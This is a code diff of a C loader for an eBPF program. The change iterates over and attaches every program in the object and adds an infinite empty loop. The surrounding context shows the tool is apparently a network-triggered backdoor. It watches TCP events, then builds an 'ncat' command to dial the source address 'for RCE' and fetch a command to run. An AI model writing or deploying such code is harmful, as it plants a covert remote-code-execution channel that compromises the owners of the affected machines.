@@ -51,33 +51,24 @@ int main(int argc, char **argv) {
     }
     printf("eBPF Probe Loaded: %s\n", path);
 
-    // Name
     const char *objname = bpf_object__name(obj);
     printf("eBPF Object Name: %s\n", objname);
 
     struct bpf_program *program = NULL;
-
-    // TODO Iterate over programs if we end up adding more
-    program = bpf_object__next_program(obj, NULL);
-    printf("eBPF Program Address: %p\n", program);
-
-    // Program Name
-    const char *progname = bpf_program__name(program);
-    printf("eBPF Program Name: %s\n", progname);
-
-    // Program Section Name
-    const char *progsecname = bpf_program__section_name(program);
-    printf("eBPF Program Section Name: %s\n", progsecname);
-
-
-    struct bpf_link *link = bpf_program__attach(program);
-    if (!link) {
-        printf("Unable to link eBPF program: %s\n", progname);
-        return 2;
+    bpf_object__for_each_program(program, obj) {
+          printf("eBPF Program Address: %p\n", program);
+          const char *progname = bpf_program__name(program);
+          printf("eBPF Program Name: %s\n", progname);
+          const char *progsecname = bpf_program__section_name(program);
+          printf("eBPF Program Section Name: %s\n", progsecname);
+          struct bpf_link *link = bpf_program__attach(program);
+          if (!link) {
+            printf("Unable to link eBPF program: %s\n", progname);
+            continue;
+          }
     }
 
     // TODO We probably want to "pin" the eBPF probe so that it will persist
-
     struct bpf_map *map = bpf_object__next_map(obj, NULL);
     const char *mapname = bpf_map__name(map);
     printf("eBPF Map Name: %s\n", mapname);
@@ -87,6 +78,7 @@ int main(int argc, char **argv) {
     printf("Logs: cat /sys/kernel/tracing/trace_pipe\n");
     printf("-----------------------------------------------\n");
 
+    while(1){}
     while(1) {
       int lookup_key = 0, next_key;
       struct tcp_return ret;
@@ -103,6 +95,7 @@ int main(int argc, char **argv) {
         printf("Dialing source for RCE: %s\n", saddrval);
 
         // Find the RCE from the source
+
         char cmd[1024];
         char rce[1024];
         sprintf(cmd, "ncat %s %d", saddrval, PORT);
